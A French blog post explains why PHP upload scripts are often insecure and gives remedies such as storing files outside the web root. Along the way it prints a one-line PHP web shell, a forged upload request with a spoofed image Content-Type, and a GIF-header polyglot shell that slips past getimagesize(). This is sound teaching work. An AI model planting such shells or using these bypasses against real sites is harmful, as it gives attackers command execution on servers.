---
title: "PHP : Les dangers des scripts d'upload"
tags: [vulnérabilité, PHP]
---

PHP et la sécurité, c'est un peu comme un vieux couple qui passerait son temps à s'envoyer de la vaisselle à la figure : ils arrivent toujours à trouver un sujet de discorde.  
PHP est à la portée de tous... et c'est peut-être ça le problème : on peut faire n'importe quoi avec et surtout rien n'empêche de le faire mal.  

Ce langage est un hybride du shell (variables commençant par le symbole dollar, pas de déclaration de types, très souple) et du C (auquel il n'a malheureusement pris que certains mots clés).  
La logique veut que si PHP soit si simple à utiliser alors il est certes très facile de faire n'importe quoi, mais aussi, ce ne doit pas être bien compliqué de faire de belles choses.  

Par conséquent, le maillon faible de la sécurité de PHP reste principalement le programmeur.  

Toutefois, certaines fonctionnalités de PHP ne viennent pas arranger les choses. Comme on dit, *"It's not a bug, it's a feature."*  

Quand j'ai découvert PHP et sa capacité à inclure des scripts distants (par la fonction `include()` et compagnie), j'ai certainement réagi comme la plupart du monde en disant *"Naaaaan ! Ils n'ont pas fait ça ?!"*  

Je veux bien croire que la lecture d'informations depuis un autre serveur peut-être utile, par exemple pour aller chercher des news sur un site (c'était l'avant-AJAX), mais de là à permettre l'exécution de code il y a un pas qu'il ne fallait mieux ne pas franchir.  

D'ailleurs il ne me semble pas avoir vu jusqu'à présent d'applications ayant recours à l'inclusion distante, seuls les pirates semblent réellement apprécier cette fonctionnalité.  

L'autre ~~gros bug~~ fonctionnalité de PHP concernait l'initialisation des variables : avec l'option `register_globals` activée par défaut, on laissait l'internaute initialiser nos variables à notre place. On se demande où ce cher Rasmus avait la tête.  

Peut-être pensait-il que cela inciterait les développeurs à être plus vigilants... évidemment ce ne fut pas le cas et l'option est maintenant désactivée par défaut.  

Plusieurs mécanismes de sécurité ont été mis en place *par dessus* pour tenter de corriger les erreurs, comme le `safe_mode`. Malheureusement quand ce ne sont pas les développeurs qui sont fautifs, c'est le langage lui-même. PHP a un très lourd passif en termes de failles de sécurité et des méthodes permettant de passer au travers du `safe_mode` sont découvertes régulièrement.  

Pour certaines failles, on peut se demander à qui incombe la responsabilité : PHP ou le programmeur ?  
Les failles relatives à l'upload de fichier en font partie. Les scripts permettant à l'internaute d'envoyer un fichier sur le serveur sont souvent mal pensés, reposent sur des à-priori et sont la plupart du temps faillibles. C'est pour cela que [Wapiti](http://wapiti.sourceforge.net/) informe automatiquement quand il en trouve un, même s'il ne peut pas tester leur sécurité.  

Parmi les grosses erreurs de programmation, on peut trouver :  

* la possibilité pour l'internaute de choisir le répertoire de destination
* la possibilité d'écraser un fichier existant
* un manque de vérification sur la nature du fichier (voire pas de vérifications du tout)

Il est évident que plus on laisse de pouvoir à l'internaute, plus les possibilités d'attaque sont nombreuses. Mais même avec certaines vérifications un script peut malgré tout être exploitable.  

Une recherche par Google sur les mots clés _upload php_ nous renvoi [un premier article](http://phpcodeur.net/articles/php/upload) proposant un script d'upload.  

La seule vérification qui est faite porte sur la nature du fichier et correspond aux lignes suivantes :  

```php
// on vérifie maintenant l'extension
$type_file = $_FILES['fichier']['type'];

if( !strstr($type_file, 'jpg') && !strstr($type_file, 'jpeg') && !strstr($type_file, 'bmp') && !strstr($type_file, 'gif') )
{
  exit("Le fichier n'est pas une image");
}
```

Si je crée un fichier `test.php` dont le contenu est le suivant :  

```php
<?php
        system($_GET['cmd']);
?>
```

Et que j'essaye de l'uploader sur le serveur, j'obtiens le message *"Le fichier n'est pas une image"*, la vérification sur le type de fichier a fonctionné.  
Mais regardons de plus près d'où viens la variable `$_FILES['fichier']['type']` : le tableau `$_FILES` est généré à partir de la requête HTTP envoyée par le navigateur.  
Si j'utilise un sniffeur comme [Ethereal](http://www.ethereal.com/) je peux récupérer la requête en question et l'analyser. Voici ce que j'obtiens (j'ai retiré le superflu) :  

```http
POST /vuln/upload.php HTTP/1.1
Host: 127.0.0.1
Content-Length: 314
Content-Type: multipart/form-data; boundary=----------hS7LOLpAKgp2vmwz0gmmrP

------------hS7LOLpAKgp2vmwz0gmmrP
Content-Disposition: form-data; name="fichier"; filename="test.php"
Content-Type: application/octet-stream

<?php
        system($_GET['cmd']);
?>

------------hS7LOLpAKgp2vmwz0gmmrP
Content-Disposition: form-data; name="upload"

Uploader
------------hS7LOLpAKgp2vmwz0gmmrP--
```

On retrouve le nom du fichier, son contenu, ainsi qu'un type `application/octet-stream` pour l'entête `Content-Type`.  
Maintenant je modifie la requête en remplaçant cet entête par `Content-Type: image/jpeg`.

Si j'envoie cette nouvelle requête au serveur (avec netcat par exemple), mon fichier `test.php` est accepté et je peux l'appeler avec l'url <http://localhost/vuln/upload/test.php.>  

Regardons un autre script. Toujours par Google, prenons [le quatrième](http://www.vulgarisation-informatique.com/upload-php.php). Cette fois la vérification de la nature du fichier ne se fait plus par le tableau `$_FILES` mais par la fonction php [getimagesize](http://fr.php.net/getimagesize).  

Quand le fichier est une image cette fonction renvoi un tableau indiquant les dimensions de l'image ainsi que son type sous la forme d'un entier. Un type de 1 correspond à un fichier gif, 2 un jpg, 3 un png... Si le fichier n'est pas une image, la fonction renvoi `FALSE` et le script échouera.  

Ici pour faire passer mon fichier php je n'ai pas beaucoup de choix : il doit être reconnu comme étant une image. La vérification du type de fichier est ici relative au format du fichier, par exemple sur les entêtes du fichier.  

Un fichier image gif commence toujours par les mêmes caractères : `GIF89a`  
Il me suffit alors de créer un fichier cmd.php dont le contenu est le suivant :  

```php
GIF89a<?php system($_GET['cmd']); ?>
```

et le tour est joué... je n'ai même pas besoin de forger moi-même la requête, il suffit d'envoyer le fichier normalement à l'aide du navigateur.  

Il faut noter que cette méthode ne semble pas fonctionner sur le format JPG qui est bien plus complexe. Il est pourtant simple de créer un fichier JPG avec du PHP dedans puisque ce format autorise l'insertion de commentaires. Mais PHP ne parvient pas à interpréter les fichiers générés.  

Tout cela nous montre qu'il est difficile de vérifier qu'un fichier est bien ce qu'il prétend être. La principale solution est tout bêtement de fixer l'extension du fichier uploadé quand cela est possible afin d'empêcher son exécution par le pirate.  

Mais même avec une extension `.gif` un fichier peut être dangereux : si un script permet d'inclure localement l'image du pirate alors PHP exécutera les commandes sans se poser la moindre question.  

La solution qui me semble la plus efficace est de stocker les fichiers dans un répertoire en dehors de la racine web.  

Une base de données doit pour cela stocker le chemin réel du fichier ainsi qu'un identifiant représentant le fichier. Il ne reste plus qu'à créer un fichier `download.php` qui récupère l'identifiant, en déduit le chemin vers le fichier sur le serveur, renvoi certains entêtes pour forcer le téléchargement et effectue un `readfile()` pour envoyer le contenu du fichier.  

Beaucoup de forums proposant l'upload d'avatars sont vulnérables à ces attaques. Ici on ne souhaite pas forcer le téléchargement, mais bien afficher l'image. On peut néanmoins utiliser une technique similaire qui renverrait les informations nécessaires dans les entêtes HTTP (obtenues à l'aide de `getimagesize()` par exemple) puis effectuerait aussi un `readfile()`.  

L'URL des images ressemblerait alors à <http://serveur/image.php?avatar=XXX>  
De plus on peut en profiter pour mettre des vérifications supplémentaires pour empêcher le hotlinking des images, un système de compteurs pour les téléchargements... bref que du bon.  

Je vous laisse une url qui explique comment mettre en place un tel système : <http://www.siteduzero.com/tuto-3-1718-1-upload-de-fichiers-par-formulaire.html>  

Bonne retouche de code ;-)  

PS : A une époque, il était même possible de remonter l'arborescence du serveur et choisir le répertoire pour l'upload en modifiant la partie *"filename"* d'une requête HTTP... Heureusement la faille a été corrigée.

*Published January 06 2011 at 13:41*
